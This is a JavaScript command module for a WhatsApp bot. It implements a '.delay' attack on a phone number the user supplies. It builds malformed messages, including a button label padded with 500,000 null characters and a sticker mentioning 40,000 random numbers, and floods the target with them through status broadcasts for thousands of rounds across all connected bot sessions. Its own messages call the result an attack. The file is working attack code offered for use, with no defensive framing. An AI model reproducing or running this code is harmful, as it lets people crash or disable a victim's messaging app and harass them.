const chalk = require("chalk");

// ==== Utilidades ====
const delay = (ms) => new Promise((res) => setTimeout(res, ms));
const cooldowns = global.delayCooldowns || new Map();

function dateTime() {
  const now = new Date();
  return now.toLocaleString("es-MX", { timeZone: "America/Mexico_City" });
}

async function safeExec(label, fn) {
  try {
    await fn();
  } catch (err) {
    console.error(`❌ Error en ${label}: ${err.message}`);
  }
}

// ==== Función 1: InVisibleX ====
async function InVisibleX(sock, jid, mention) {
  let msg = await generateWAMessageFromContent(jid, {
    buttonsMessage: {
      text: "🩸",
      contentText: "@raysofhopee",
      footerText: "vip",
      buttons: [
        {
          buttonId: ".aboutb",
          buttonText: {
            displayText: "HADES VIP!" + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "hmmm",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

// ==== Función 2: xatanicaldelayv2 ====
async function xatanicaldelayv2(sock, jid, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// ==== Función 3: sickdelay ====
async function sickdelay(sock, jid) {
  if (!sock.user) throw new Error("Bot no está activo.");

  console.log(chalk.green(`STARTING DELAY ${jid}`));

  for (let i = 1; i <= 3900; i++) {
    if (!sock.user) break;

    console.log(chalk.red.bold(`DELAY SEND TO ${jid}`));

    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
    await delay(400);
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
    await delay(2000);
  }

  console.log(`✅ Finalizado delay para ${jid} por ${sock.user.id}`);
}

// ==== Comando .delay CrowBot ====
module.exports = {
  name: "delay",
  commands: ["delay"],
  handle: async ({ sock, args, remoteJid }) => {
    const cooldownTime = 60 * 1000;
    const now = Date.now();
    const userNumber = remoteJid;

    const input = args[0];
    if (!input) {
      return sock.sendMessage(remoteJid, {
        text: "❗️Ejemplo: *.delay 52xxxxxxxxxx*",
      });
    }

    const formattedNumber = input.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    const lastUse = cooldowns.get(userNumber);
    if (lastUse && now - lastUse < cooldownTime) {
      const remaining = Math.ceil((cooldownTime - (now - lastUse)) / 1000);
      return sock.sendMessage(remoteJid, {
        text: `⏱️ Espera ${remaining} segundos antes de usarlo de nuevo.`,
      });
    }

    cooldowns.set(userNumber, now);
    global.delayCooldowns = cooldowns;

    await sock.sendMessage(remoteJid, {
      image: { url: "https://files.catbox.moe/bbnxok.jpg" },
      caption: `
╭━━━⭓「 SENDING BUG 」
┃ ◇ FECHA : ${dateTime()}
┃ ◇ USUARIO : ${userNumber.split("@")[0]}
┃ ◇ MÉTODO : DELAY
┃ ◇ TARGET : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

🔗 https://wa.me/${formattedNumber}
      `.trim(),
    });

    let success = 0;
    let fail = 0;

    for (const [botNum, conn] of sessions.entries()) {
      try {
        await sickdelay(conn, jid);
        success++;
      } catch (err) {
        console.log(`❌ Error con ${botNum}: ${err.message}`);
        fail++;
      }
    }

    await sock.sendMessage(remoteJid, {
      text: `✅ Ataque finalizado\n✔️ Bots enviados: ${success}\n❌ Bots fallidos: ${fail}`,
    });
  },
};